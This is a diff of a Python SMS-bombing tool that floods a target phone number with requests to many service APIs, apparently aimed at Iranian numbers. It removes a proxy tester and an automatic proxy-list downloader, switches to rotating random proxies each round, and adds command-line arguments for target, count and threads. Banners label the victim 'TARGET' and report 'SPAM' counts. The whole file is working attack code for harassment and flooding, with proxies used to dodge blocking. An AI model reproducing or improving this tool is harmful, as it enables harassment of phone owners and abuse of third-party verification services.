@@ -9,8 +9,6 @@ from colorama import Fore, init, Style
 from fake_useragent import UserAgent
 import urllib3
 from concurrent.futures import ThreadPoolExecutor, as_completed
-import socket
-import struct
 
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -101,118 +99,10 @@ def get_random_user_agent():
     ua = UserAgent()
     return ua.random
 
-# ===== PROXY TESTER =====
-def test_proxy(proxy_str, timeout=5):
-    """
-    تست پروکسی و محاسبه پینگ
-    برمیگرداند: (is_alive, ping_ms, ip, country)
-    """
-    try:
-        # تست با ipify برای دیدن IP خروجی
-        start_time = time.time()
-        
-        proxies = {
-            "http": proxy_str,
-            "https": proxy_str.replace("http://", "https://") if proxy_str.startswith("http://") else proxy_str
-        }
-        
-        response = requests.get(
-            "https://api.ipify.org?format=json",
-            proxies=proxies,
-            timeout=timeout,
-            verify=False
-        )
-        
-        ping_ms = int((time.time() - start_time) * 1000)
-        
-        if response.status_code == 200:
-            data = response.json()
-            ip = data.get("ip", "Unknown")
-            
-            # تشخیص کشور از IP (با ip-api.com)
-            try:
-                geo_response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
-                if geo_response.status_code == 200:
-                    geo_data = geo_response.json()
-                    country = geo_data.get("countryCode", "??")
-                else:
-                    country = "??"
-            except:
-                country = "??"
-            
-            return True, ping_ms, ip, country
-        else:
-            return False, 0, None, None
-            
-    except requests.exceptions.Timeout:
-        return False, 0, None, None
-    except requests.exceptions.ConnectionError:
-        return False, 0, None, None
-    except Exception:
-        return False, 0, None, None
-
-def test_and_select_proxy(proxies):
-    """تست همه پروکسی‌ها و انتخاب بهترین (کمترین پینگ)"""
-    if not proxies:
-        print(f"{YELLOW}⚠ No proxies to test!")
-        return None, None, None
-    
-    print(f"{CYAN}🔍 Testing {len(proxies)} proxies...")
-    print(f"{CYAN}┌────────────────────────────────────────────────────────────┐")
-    
-    alive_proxies = []
-    
-    for i, proxy in enumerate(proxies, 1):
-        # نمایش پیشرفت
-        bar_length = 30
-        percent = i / len(proxies)
-        filled = int(bar_length * percent)
-        bar = '█' * filled + '░' * (bar_length - filled)
-        sys.stdout.write(f"\r{CYAN}│ {bar} {percent*100:.0f}%  Testing proxy {i}/{len(proxies)}")
-        sys.stdout.flush()
-        
-        is_alive, ping, ip, country = test_proxy(proxy)
-        
-        if is_alive:
-            status = f"{GREEN}✓ Alive"
-            alive_proxies.append({
-                "proxy": proxy,
-                "ping": ping,
-                "ip": ip,
-                "country": country
-            })
-            
-            # نمایش پروکسی‌های زنده
-            print(f"\r{CYAN}│ {GREEN}✓ {proxy[:40]:<40} {GREEN}Ping: {ping}ms  {country}  {ip}")
-        else:
-            print(f"\r{CYAN}│ {RED}✗ {proxy[:40]:<40} {RED}Dead")
-    
-    print(f"{CYAN}└────────────────────────────────────────────────────────────┘\n")
-    
-    if not alive_proxies:
-        print(f"{RED}❌ No alive proxies found!")
-        return None, None, None
-    
-    # مرتب‌سازی بر اساس پینگ (کمترین اول)
-    alive_proxies.sort(key=lambda x: x["ping"])
-    
-    # انتخاب بهترین
-    best = alive_proxies[0]
-    
-    print(f"{GREEN}🏆 BEST PROXY SELECTED:")
-    print(f"{GREEN}   Proxy: {best['proxy']}")
-    print(f"{GREEN}   Ping:  {best['ping']}ms")
-    print(f"{GREEN}   IP:    {best['ip']}")
-    print(f"{GREEN}   Country: {best['country']}")
-    print(f"{GREEN}   Total Alive: {len(alive_proxies)}/{len(proxies)}\n")
-    
-    return best["proxy"], best["ping"], alive_proxies
-
-# ===== PROXY MANAGEMENT =====
+# Load proxies from file
 def load_proxies():
     proxies = []
     try:
-        # اول سعی کن از فایل بخونه
         if os.path.exists("proxies.txt"):
             with open("proxies.txt", "r", encoding="utf-8") as f:
                 for line in f:
@@ -222,39 +112,16 @@ def load_proxies():
                             line = f"http://{line}"
                         proxies.append(line)
             if proxies:
-                print(f"{GREEN}✓ Loaded {len(proxies)} proxies from file")
+                print(f"{GREEN}✓ Loaded {len(proxies)} proxies")
             else:
                 print(f"{YELLOW}⚠ No proxies found in proxies.txt")
         else:
-            print(f"{YELLOW}⚠ proxies.txt not found. Trying to download...")
-            proxies = download_proxies()
+            print(f"{YELLOW}⚠ proxies.txt not found. Running without proxy.")
     except Exception as e:
         print(f"{RED}✗ Error loading proxies: {e}")
-        proxies = download_proxies()
-    
     return proxies
 
-def download_proxies():
-    """دانلود پروکسی‌های تست‌شده ایرانی از OpenRay"""
-    try:
-        print(f"{YELLOW}📥 Downloading Iranian proxies from OpenRay...")
-        url = "https://raw.githubusercontent.com/sakha1370/OpenRay/refs/heads/main/output_iran/iran_top100_checked.txt"
-        response = requests.get(url, timeout=10)
-        if response.status_code == 200:
-            proxies = response.text.splitlines()
-            proxies = [p.strip() for p in proxies if p.strip()]
-            # ذخیره در فایل
-            with open("proxies.txt", "w") as f:
-                f.write("\n".join(proxies))
-            print(f"{GREEN}✓ Downloaded {len(proxies)} proxies from OpenRay")
-            return proxies
-        else:
-            print(f"{RED}✗ Failed to download proxies")
-            return []
-    except Exception as e:
-        print(f"{RED}✗ Error downloading proxies: {e}")
-        return []
-
+# Get random proxy
 def get_random_proxy(proxies):
     if proxies:
         proxy = random.choice(proxies)
@@ -509,27 +376,19 @@ def send_request(api, n, n0, n_plus, proxy=None):
         return name, False
 
 # Send requests to all APIs for a single target
-def send_requests_for_target(phone_number, thread_count, spam_count, best_proxy):
+def send_requests_for_target(phone_number, thread_count, spam_count, proxies):
     n = format_phone(phone_number)
     n0 = f"0{n}"
     n_plus = f"+98{n}"
     
     apis = get_services(n, n0, n_plus)
     
-    # تنظیم پروکسی
-    proxy = None
-    if best_proxy:
-        proxy = {
-            "http": best_proxy,
-            "https": best_proxy.replace("http://", "https://") if best_proxy.startswith("http://") else best_proxy
-        }
-    
     print(f"{GREEN}┌────────────────────────────────────────────────────────────┐")
     print(f"{GREEN}│ {RED}☠️ TARGET: {GREEN}{n0}")
     print(f"{GREEN}│ {RED}💀 APIS: {GREEN}{len(apis)}")
     print(f"{GREEN}│ {RED}🔥 THREADS: {GREEN}{thread_count}")
     print(f"{GREEN}│ {RED}🩸 SPAM: {GREEN}{spam_count}")
-    print(f"{GREEN}│ {RED}🌐 PROXY: {GREEN}{best_proxy if best_proxy else 'None'}")
+    print(f"{GREEN}│ {RED}🌐 PROXIES: {GREEN}{len(proxies) if proxies else 0}")
     print(f"{GREEN}└────────────────────────────────────────────────────────────┘\n")
     
     total_success = 0
@@ -541,6 +400,8 @@ def send_requests_for_target(phone_number, thread_count, spam_count, best_proxy)
         success_count = 0
         fail_count = 0
         start_time = time.time()
+        
+        proxy = get_random_proxy(proxies) if proxies else None
         
         with ThreadPoolExecutor(max_workers=thread_count) as executor:
             futures = {executor.submit(send_request, api, n, n0, n_plus, proxy): api for api in apis}
@@ -565,7 +426,7 @@ def send_requests_for_target(phone_number, thread_count, spam_count, best_proxy)
     return total_success, total_fail
 
 # Send requests to multiple targets (max 3)
-def send_requests(phone_numbers, thread_count, spam_count, best_proxy):
+def send_requests(phone_numbers, thread_count, spam_count, proxies):
     if isinstance(phone_numbers, str):
         phone_numbers = [phone_numbers]
     
@@ -579,7 +440,7 @@ def send_requests(phone_numbers, thread_count, spam_count, best_proxy):
     print(f"{GREEN}│ {RED}💀 TOTAL TARGETS: {GREEN}{len(phone_numbers)}")
     print(f"{GREEN}│ {RED}🔥 THREADS: {GREEN}{thread_count}")
     print(f"{GREEN}│ {RED}🩸 SPAM PER TARGET: {GREEN}{spam_count}")
-    print(f"{GREEN}│ {RED}🌐 PROXY: {GREEN}{best_proxy if best_proxy else 'None'}")
+    print(f"{GREEN}│ {RED}🌐 PROXIES: {GREEN}{len(proxies) if proxies else 0}")
     print(f"{GREEN}└────────────────────────────────────────────────────────────┘\n")
     
     all_results = []
@@ -588,7 +449,7 @@ def send_requests(phone_numbers, thread_count, spam_count, best_proxy):
     
     for idx, phone in enumerate(phone_numbers, 1):
         print(f"{YELLOW}▶ Processing target {idx}/{len(phone_numbers)}: {phone}")
-        success, fail = send_requests_for_target(phone, thread_count, spam_count, best_proxy)
+        success, fail = send_requests_for_target(phone, thread_count, spam_count, proxies)
         all_results.append({'phone': phone, 'success': success, 'fail': fail})
         total_success_all += success
         total_fail_all += fail
@@ -624,25 +485,9 @@ def send_requests(phone_numbers, thread_count, spam_count, best_proxy):
 def main():
     show_banner()
     
-    # ===== STEP 1: Load Proxies =====
     proxies = load_proxies()
     print()
     
-    # ===== STEP 2: Test Proxies and Select Best =====
-    if proxies:
-        best_proxy, best_ping, alive_proxies = test_and_select_proxy(proxies)
-        if best_proxy:
-            print(f"{GREEN}✅ Using best proxy: {best_proxy} (Ping: {best_ping}ms)")
-        else:
-            print(f"{YELLOW}⚠ No alive proxies found. Running without proxy.")
-            best_proxy = None
-    else:
-        print(f"{YELLOW}⚠ No proxies available. Running without proxy.")
-        best_proxy = None
-    
-    print()
-    
-    # ===== STEP 3: Main Loop =====
     while True:
         print(f"{GREEN}┌────────────────────────────────────────────────────────────┐")
         print(f"{GREEN}│ {GREEN}☠️ Phone Number : {WHITE}", end="")
@@ -695,7 +540,7 @@ def main():
         
         print(f"{GREEN}└────────────────────────────────────────────────────────────┘\n")
         
-        send_requests(phone_numbers, thread_count, spam_count, best_proxy)
+        send_requests(phone_numbers, thread_count, spam_count, proxies)
         
         print(f"{GREEN}┌────────────────────────────────────────────────────────────┐")
         print(f"{GREEN}│ {GREEN}CONTINUE OPERATION? {GREEN}(y/n): {WHITE}", end="")
@@ -707,8 +552,10 @@ def main():
             break
 
 if __name__ == "__main__":
-    try:
+    if len(sys.argv) >= 4:
+        phone = sys.argv[1]
+        count = int(sys.argv[2])
+        threads = int(sys.argv[3])
+        send_requests(phone, threads, count, [])
+    else:
         main()
-    except KeyboardInterrupt:
-        print(f"\n\n{RED}☠️ OPERATION INTERRUPTED! {RED}❤️")
-        sys.exit(0)
